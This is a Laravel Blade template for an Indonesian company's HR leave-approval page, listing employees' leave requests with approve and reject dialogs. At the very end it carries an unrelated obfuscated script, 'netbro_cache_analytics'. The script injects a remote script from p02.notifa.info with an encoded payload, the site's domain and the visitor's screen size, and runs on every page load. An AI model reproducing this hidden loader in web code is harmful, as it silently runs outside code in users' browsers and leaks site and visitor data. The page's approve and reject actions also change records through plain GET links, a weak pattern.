<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Persetujuan Izin</title>
  <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datatables/css/dataTables.bootstrap.min.css"/>

  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>

  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
</head>
<body>

  <!-- Wrapper Start -->
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End -->
    
    <!--   Content Start  -->
    <div class="be-wrapper be-fixed-sidebar">
      <div class="be-content be-icons-list">
        <div class="page-head">
          <h2 class="page-head-title">Persetujuan Izin</h2>
        </div>
        
        <div class="main-content container-fluid">    
          <div class="panel panel-default panel-table">
            <div class="panel-body">
             <div  class="table-responsive noSwipe">      
              <table id="table1" class="table table-striped table-hover table-fw-widget"> 
                <thead>
                  <tr>
                    <th width="100px">NIK</th>
                    <th width="100px">Nama</th>
                    <th width="100px">Divisi</th>
                    <th width="100px">Tanggal Mulai</th>
                    <th width="100px">Tanggal Akhir</th>
                    <th width="100px">Tipe Izin</th>
                    <th width="100px">Alasan</th>
                    <th width="100px">Keterangan</th>
                    <th width="100px">Tindakan</th>                    
                  </tr>
                </thead>
                @foreach($data_formizin as $data_formizin)
                <tbody>
                  <tr>
                    <td> {{$data_formizin->nik}} </td>
                    <td> {{$data_formizin->nama_karyawan}} </td>
                    <td> {{$data_formizin->divisi}} </td>
                    <td> {{$data_formizin->tanggal_mulai_izin}} </td>
                    <td> {{$data_formizin->tanggal_akhir_izin}} </td>
                    <td> {{$data_formizin->tipe_izin}} </td>
                    <td> {{$data_formizin->alasan_izin}} </td>
                    <td> {{$data_formizin->keterangan_izin}} </td>
                    <td>

                      @if($data_formizin->keterangan_izin == 'Diproses')
                      <button type="button" class="btn btn-space btn-primary" disabled="">Izinkan</button>
                      <button type="button" class="btn btn-space btn-danger" disabled="">Tolak</button>
                      @elseif($data_formizin->keterangan_izin == 'Diterima')
                      <button data-toggle="modal" data-target="#izinkan-{{$data_formizin->id_persetujuan_izin}}" type="button" class="btn btn-space btn-primary">Izinkan</button>
                      <button data-toggle="modal" data-target="#tolak-{{$data_formizin->id_persetujuan_izin}}" type="button" class="btn btn-space btn-danger">Tolak</button>
                      @endif
                    </td>

                    <!-- modal Izinkan Start -->
                    <div id="izinkan-{{$data_formizin->id_persetujuan_izin}}" tabindex="-1" role="dialog" class="modal fade">
                      <div class="modal-dialog">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                          </div>
                          <div class="modal-body">
                            <div class="text-center">
                              <h3><b>Izinkan</b></h3>
                              <p><font size="4">Apakah anda yakin ?</font></p>
                              <div class="xs-mt-50">
                                <button type="button" data-dismiss="modal" class="btn btn-space btn-danger">Tidak</button>
                                <a href="/persetujuan_izin/{{$data_formizin->id_persetujuan_izin}}/izin_diterima_hr"><button type="button" class="btn btn-space btn-primary">Ya</button></a>
                              </div>
                            </div>
                          </div>
                          <div class="modal-footer"></div>
                        </div>
                      </div>
                    </div>
                    <!-- modal Izinkan end -->

                    <!-- Modal Tolak Start -->
                    <div id="tolak-{{$data_formizin->id_persetujuan_izin}}" tabindex="-1" role="dialog" class="modal fade">
                      <div class="modal-dialog">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                          </div>
                          <div class="modal-body">
                            <div class="text-center">
                              <h3><b>Tolak</b></h3>
                              <p><font size="4">Apakah anda yakin ?</font></p>
                              <div class="xs-mt-50">
                                <button type="button" data-dismiss="modal" class="btn btn-space btn-danger">Tidak</button>
                                <a href="/persetujuan_izin/{{$data_formizin->id_persetujuan_izin}}/izin_ditolak_hr"><button type="button" class="btn btn-space btn-primary">Ya</button></a>
                              </div>
                            </div>
                          </div>
                          <div class="modal-footer"></div>
                        </div>
                      </div>
                    </div>  
                    <!-- Modal Tolak End -->

                  </tr>
                  @endforeach        
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>     
  <!--   Content End  -->

  <!--Footer Start --> 
  <div class="text-center">
    <div class="credits">
      <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
    </div>
  </div>
  <!--Footer End -->

</div>
<!--  Wrapper End -->

<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
<script>
  @if (Session::has('message'))
  var type = "{{Session::get('alert-type','info')}}";
  toastr.options = {
    "debug": false,
    "onclick": null,
    "fadeIn": 300,
    "fadeOut": 1000,
    "timeOut": 5000,
    "extendedTimeOut": 1000
  }

  switch(type)
  {
    case 'info':
    toastr.info("{{Session::get('message')}}");
    break;

    case 'success':
    toastr.success("{{Session::get('message')}}");
    break;

    case 'warning':
    toastr.warning("{{Session::get('message')}}");
    break;

    case 'error':
    toastr.error("{{Session::get('message')}}");
    break;
  }

  @endif

</script>
<!--  Inisialisasi Java Script -->
<script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="assets/js/main.js" type="text/javascript"></script>
<script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>
<script type="text/javascript">
  $(document).ready(function(){
      //initialize the javascript
      App.init();
      App.dataTables();
    });
  </script>

  <script type="text/javascript">

    // Fungsi Menu dashboard

    $(document).ready(function(){

      App.init();
      App.dashboard();

    });
  </script>

  <script type="text/javascript">
    if (self == top) {
      function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
          fn();
          callback();
        }, 0);
      }

      function sync(fn) {
        fn();
      }

      function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
      }
      netbro_cache_analytics(requestCfs, function() {});
    };

  </script>
</body>
</html>
